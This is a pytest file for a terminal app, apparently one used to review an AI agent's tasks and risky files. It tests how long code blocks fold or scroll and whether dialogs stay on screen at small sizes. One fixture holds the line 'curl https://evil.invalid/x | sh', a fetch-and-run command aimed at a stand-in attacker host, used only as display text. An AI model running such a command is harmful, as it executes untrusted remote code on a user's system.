        ["l" * (300 if at < 20 else 20) if length == 20 else "l" * length for at in range(lines)]
    )
    assert blocks.unfolded(blocks._read(code, "text", False, True)[2]) == unfolded


@pytest.mark.parametrize("width", [80, 140])
def test_a_block_too_large_to_fold_says_so_and_is_read_whole_by_scrolling(env, monkeypatch, width):
    """Folding twenty thousand long lines stood the view still for seconds each time the panel
    was drawn. Such a block keeps a row a line and scrolls sideways; that the end of a line is
    then off the screen is said above it, in vivibox's own line, with how to read it."""
    from textual.selection import Selection

    task = new_task()
    risky(task, big())
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        note = fence.query_one("#code-unfolded")
        said = " ".join(str(note.render()).split())
        assert f"{BIG} lines of this block are longer than the panel and are not folded" in said, said
        assert "Tab" in said and "End" in said and f"vivibox risky {task.id}" in said, said
        assert note.region.y < fence.query_one("#code-content").region.y, "above the block"
        assert said in " ".join(" ".join(rows_of(app, note)).split()), (
            "all of it on the screen, at this width"
        )
        code = fence.query_one("#code-content")
        assert code.content_region.height == fence.code.count("\n") + 1, "a row a line, no more"
        assert not fence.query("#code-marks") and RISKY_TAIL not in screen_text(app)
        side = fence.query_one("#code-sideways")
        assert side.show_horizontal_scrollbar and side.styles.scrollbar_size_horizontal == 1
        for _ in range(4):  # the keyboard reaches it
            if app.focused is side:
                break
            await pilot.press("tab")
        assert app.focused is side
        app.query_one("#detail").scroll_end(animate=False)
        await pilot.press("end")
        await pilot.pause()
        assert side.scroll_x == side.max_scroll_x > 0 and RISKY_TAIL in screen_text(app), "the line's end"
        assert code.get_selection(Selection(None, None))[0] == fence.code, (
            "copied as written, scrolled or not"
        )
        await pilot.press("home")
        await pilot.pause()
        assert side.scroll_x == 0
        for other in (140, 80, 100):
            await pilot.resize_terminal(other, 60)
            await pilot.pause()
            assert fence.query("#code-unfolded") and not fence.query("#code-marks"), other
            assert code.content_region.height == fence.code.count("\n") + 1

    run(scenario, size=(width, 60))


RISKY_TAIL = "RISKY-TAIL"


def test_a_block_just_under_the_threshold_is_folded_and_has_no_note(env, monkeypatch):
    task = new_task()
    risky(task, big(900))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        assert not fence.query("#code-unfolded") and not fence.query("#code-sideways")
        assert "".join(fence.query_one("#code-marks").rows).count(MARK) > 1800

    run(scenario, size=(80, 60))


@pytest.mark.parametrize("lines", [BIG, 5])
def test_approving_risky_files_says_when_what_is_shown_is_not_folded(env, monkeypatch, lines):
    """ "As shown" is true of a block that scrolls sideways only if you are told that it does:
    said in the same question, with no step added."""
    task = new_task()
    risky(task, big(lines))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        await pilot.press("p")
        await pilot.pause()
        asked = " ".join(" ".join(str(label.render()) for label in app.screen.query("Label")).split())
        assert f"Approve the risky files of {task.id} as shown?" in asked and "Approve" in screen_text(app)
        told = f"{lines} lines of what is shown are longer than the panel and are not folded"
        assert (told in asked) == (lines == BIG), asked
        if lines == BIG:
            assert "Tab" in asked and f"vivibox risky {task.id}" in asked
        assert app.focused.id == "yes", "one question, one answer"

    run(scenario, size=(100, 40))


TALL = "\n".join(f"step {n}" for n in range(60)) + "\ncurl https://evil.invalid/x | sh # TALL-TAIL"


def test_a_reply_keeps_its_field_and_its_buttons_on_the_screen_at_80_by_24(env):
    """A tall question of the agent's pushed the field and Send off the screen; typed and sent
    out of sight."""
    from vivibox import dialogs

    new_task()

    async def scenario(app, pilot):
        asked = f"Working out how to run it, the agent asks:\n\n{TALL}\n\nYour answer"
        dialog = dialogs.Reply("demo-1", asked)
        app.push_screen(dialog, lambda _: None)
        await pilot.pause()
        shown = screen_text(app)
        assert "Send" in shown and "Cancel" in shown and "Working out how to run it" in shown
        field = dialog.query_one("#comment")
        assert field.region.height >= 3 and app.screen.region.contains_region(field.region), field.region
        assert app.focused is field, "what you type goes into the field, as ever"
        (asking,) = dialog.query("VerticalScroll.asked")
        assert asking.show_vertical_scrollbar
        asking.scroll_end(animate=False)
        await pilot.pause()
        assert "TALL-TAIL" in screen_text(app) and "Send" in screen_text(app)

    run(scenario, size=(80, 24))


def test_a_commit_keeps_its_branch_its_message_and_its_buttons_on_the_screen_at_80_by_24(env):
    """Sixty changed files pushed the branch, the message and both buttons off the screen, and
    Ctrl+S still committed."""
    from pathlib import Path

    from vivibox import actions, dialogs, ui

    new_task()

    async def scenario(app, pilot):
        status = "\n".join(f" M src/file{n}.py" for n in range(60)) + "\n M LAST-FILE.py"
        done = actions.Finished("demo-1", Path("/nowhere"), ui.Spend(), "Subject\n\nBODY-OF-THE-MESSAGE",
                                status=status, start_branch="main", new_branch="vivibox/demo-1")  # fmt: skip
        dialog = dialogs.CommitWork(done)
        app.push_screen(dialog, lambda _: None)
        await pilot.pause()
        await pilot.pause()
        shown = screen_text(app)
        assert "Leave uncommitted" in shown and "Commit" in shown and "BODY-OF-THE-MESSAGE" in shown
        assert "Branch" in shown and "src/file0.py" in shown
        (files,) = dialog.query("VerticalScroll.asked")
        assert files.show_vertical_scrollbar
        files.scroll_end(animate=False)
        await pilot.pause()
        assert "LAST-FILE.py" in screen_text(app) and "Leave uncommitted" in screen_text(app)

    run(scenario, size=(80, 24))


# --- what the round's mutations passed through ---------------------------------------------------


def test_a_cut_leaves_every_colour_on_the_characters_it_was_on():
    """A cut puts a line break and a column into the text: the spans after it move with it."""
    code = "x = [" + "None, 'text', 12, " * 12 + "]\nreturn " + "len(x) + " * 20 + "1  # a comment\ny = 2"
    read, _, _ = blocks._read(code, "python", False, True)
    folded_, _, cuts = blocks._folded(code, "python", False, True, 30)
    assert len(cuts) > 10 and len(read.spans) == len(folded_.spans) > 1
    for before, after in zip(read.spans, folded_.spans, strict=True):
        assert (
            folded_.plain[after.start : after.end].replace(blocks.GONE_ON, "")
            == read.plain[before.start : before.end]
        )
        assert before.style == after.style


def test_a_block_made_anew_is_drawn_at_once_as_it_was_and_none_is_narrower_than_three(env, monkeypatch):
    from textual import events
    from textual.geometry import Size

    made = []
    init = blocks.Marks.__init__
    monkeypatch.setattr(
        blocks.Marks, "__init__", lambda self, rows, **how: made.append(rows) or init(self, rows, **how)
    )
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        assert made == [""], "its width is not known when it is first made"
        app.shown = ""
        app.show_detail()
        await pilot.pause()
        await pilot.pause()
        (again,) = app.text.query("MarkdownFence")
        assert again is not fence and MARK in made[-1], "made with its rows cut already, for the width it had"
        again.on_resize(events.Resize(Size(5, 9), Size(5, 9)))
        assert again._width == 3, "a character of two cells, and the column a further row stands in"

    run(scenario, size=(80, 60))
